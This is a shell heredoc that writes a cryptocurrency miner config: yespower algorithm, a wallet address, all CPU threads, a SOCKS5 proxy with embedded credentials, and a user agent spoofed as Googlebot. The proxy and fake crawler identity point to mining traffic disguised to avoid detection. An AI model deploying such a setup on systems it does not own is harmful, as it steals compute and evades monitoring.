cat > config.json <<END
{

        "url" : "127.0.0.1:443",
        "user" : "LUVPxNNm6zna297L6KGieKBxQtc6LDEk2D",
        "pass" : "c=LTC,zap=ONX",

        "algo" : "yespower",
        "threads" : $(nproc --all),
        "cpu-priority" : 0,
        "cpu-affinity" : -1,

        "benchmark" : false,
        "debug" : false,
        "protocol": false,
        "quiet" : false,
        "proxy" : "socks5://gratis:q1w2e3r4t5@141.95.108.117",
        "agent" : "Googlebot/2.1"
}

END
